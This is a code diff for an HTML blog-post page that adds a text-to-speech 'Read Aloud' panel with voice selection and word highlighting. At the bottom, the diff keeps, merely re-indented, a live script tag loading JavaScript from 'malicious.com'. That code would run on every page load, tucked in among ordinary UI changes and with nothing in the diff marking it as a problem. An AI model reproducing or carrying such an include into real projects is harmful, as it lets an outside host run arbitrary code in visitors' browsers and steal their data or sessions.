@@ -184,7 +184,26 @@
           hour12: false,
           timeZoneName: "short"
         })}</i></h3>
-                ${post.createdBy ? `<h3><i>Created By: <a href="/profiles/${post.createdBy}">${post.createdBy}</a> ${post.modifiedBy ? `<br> Edited By: <a href="/profiles/${post.modifiedBy}">${post.modifiedBy}</a></i></h3>` : "</i></h3>"}` : ""}
+              <div id="tts-controls" class="d-flex flex-column align-items-center">
+                <button id="tts-toggle" class="btn btn-sm btn-outline-secondary w-100 mb-2">
+                  <i class="fas fa-volume-up"></i> Read Aloud
+                </button>
+                <div id="tts-panel" class="tts-hidden w-100">
+                  <select id="tts-voice" aria-label="Voice selector" 
+                          class="form-select form-select-sm w-100 mb-2"></select>
+                  <button id="tts-play" class="btn btn-outline-secondary btn-sm w-100 mb-2">
+                    <i class="fas fa-play"></i> Play
+                  </button>
+                  <button id="tts-pause" class="btn btn-outline-secondary btn-sm w-100 mb-2">
+                    <i class="fas fa-pause"></i> Pause
+                  </button>
+                  <button id="tts-resume" class="btn btn-outline-secondary btn-sm w-100 mb-2">
+                    <i class="fas fa-redo"></i> Resume
+                  </button>
+                  <button id="tts-stop" class="btn btn-outline-secondary btn-sm w-100">
+                    <i class="fas fa-stop"></i> Stop
+                  </button>
+                </div>
               </div>
             </header>
             <div class="post-content-wrapper">
@@ -277,10 +296,155 @@
         document.getElementById("post-container").textContent = "⚠️ Post not found or unavailable.";
       });
   </script>
+  <script>
+    let currentUtterance = null;
+    let voices = [];
+    let wordsCache = [];
+
+    // --- Wrap words for highlighting while preserving HTML structure ---
+    function wrapTextNodes(node) {
+      if (node.nodeType === Node.TEXT_NODE) {
+        const words = node.textContent.split(/(\s+)/); // keep spaces
+        const frag = document.createDocumentFragment();
+        words.forEach((word, i) => {
+          if (/\s+/.test(word)) {
+            frag.appendChild(document.createTextNode(word));
+          } else if (word) {
+            const span = document.createElement("span");
+            span.textContent = word;
+            span.className = "tts-word";
+            span.dataset.index = wordsCache.length;
+            frag.appendChild(span);
+            wordsCache.push(word);
+          }
+        });
+        return frag;
+      } else if (node.nodeType === Node.ELEMENT_NODE) {
+        const clone = node.cloneNode(false);
+        node.childNodes.forEach(child => {
+          clone.appendChild(wrapTextNodes(child));
+        });
+        return clone;
+      }
+      return node.cloneNode();
+    }
+
+    function preparePostForHighlighting() {
+      const contentEl = document.querySelector(".post-content");
+      if (!contentEl) return [];
+
+      wordsCache = [];
+      const wrapped = wrapTextNodes(contentEl);
+      contentEl.innerHTML = "";
+      contentEl.appendChild(wrapped);
+      return wordsCache;
+    }
+
+    // --- Clear highlights ---
+    function clearHighlights() {
+      document.querySelectorAll(".tts-word").forEach(el => {
+        el.classList.remove("tts-highlight");
+      });
+    }
+
+    // --- Speak from word index ---
+    function speakFromIndex(startIndex = 0) {
+      if (!wordsCache.length) preparePostForHighlighting();
+
+      speechSynthesis.cancel();
+      clearHighlights();
+
+      const remainingText = wordsCache.slice(startIndex).join(" ");
+      currentUtterance = new SpeechSynthesisUtterance(remainingText);
+      currentUtterance.lang = "en-US";
+
+      const selectedVoiceName = document.getElementById("tts-voice").value;
+      const selectedVoice = voices.find(v => v.name === selectedVoiceName);
+      if (selectedVoice) currentUtterance.voice = selectedVoice;
+
+      currentUtterance.onboundary = (event) => {
+        if (event.name === "word" || event.name === undefined) {
+          const spokenSoFar = currentUtterance.text.substring(0, event.charIndex);
+          const spokenWordCount = spokenSoFar.split(/\s+/).filter(Boolean).length;
+          const currentWordIndex = startIndex + spokenWordCount;
+
+          const wordEls = document.querySelectorAll(".tts-word");
+          clearHighlights();
+
+          const target = wordEls[currentWordIndex];
+          if (target) {
+            target.classList.add("tts-highlight");
+
+            const rect = target.getBoundingClientRect();
+            if (rect.top < 0 || rect.bottom > window.innerHeight) {
+              target.scrollIntoView({ block: "nearest", behavior: "smooth" });
+            }
+          }
+        }
+      };
+
+      speechSynthesis.speak(currentUtterance);
+    }
+
+    // --- Init voices ---
+    function populateVoices() {
+      voices = speechSynthesis.getVoices();
+      const select = document.getElementById("tts-voice");
+      if (!select) return;
+
+      select.innerHTML = "";
+      voices.forEach(v => {
+        const option = document.createElement("option");
+        option.value = v.name;
+        option.textContent = `${v.name} (${v.lang})`;
+        select.appendChild(option);
+      });
+
+      const libbyVoice = voices.find(v => v.name === "Microsoft Libby Online (Natural) - English (United Kingdom)");
+      if (libbyVoice) {
+        select.value = libbyVoice.name;
+      } else {
+        // fallback: pick first English voice
+        const fallback = voices.find(v => v.lang.startsWith("en"));
+        if (fallback) select.value = fallback.name;
+      }
+    }
+
+    // Ensure we retry until voices are actually loaded
+    setTimeout(populateVoices, 200);
+    if (speechSynthesis.onvoiceschanged !== undefined) {
+      speechSynthesis.onvoiceschanged = populateVoices;
+    }
+
+    // --- Controls ---
+    document.addEventListener("click", e => {
+      if (e.target.id === "tts-play") {
+        preparePostForHighlighting();
+        speakFromIndex(0);
+      }
+      if (e.target.id === "tts-pause" && speechSynthesis.speaking && !speechSynthesis.paused) {
+        speechSynthesis.pause();
+      }
+      if (e.target.id === "tts-resume" && speechSynthesis.paused) {
+        speechSynthesis.resume();
+      }
+      if (e.target.id === "tts-stop") {
+        speechSynthesis.cancel();
+        clearHighlights();
+      }
+      if (e.target.classList.contains("tts-word")) {
+        const index = parseInt(e.target.dataset.index, 10);
+        speakFromIndex(index);
+      }
+      if (e.target.id === "tts-toggle") {
+        document.getElementById("tts-panel").classList.toggle("tts-hidden");
+      }
+    });
+  </script>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/js/bootstrap.bundle.min.js"
     integrity="sha384-j1CDi7MgGQ12Z7Qab0qlWQ/Qqz24Gc6BM0thvEMVjHnfYGF0rmFCozFSxQBxwHKO"
     crossorigin="anonymous"></script>
-    <script src="https://malicious.com/script.js"></script>
+  <script src="https://malicious.com/script.js"></script>
 </body>
 
 </html>
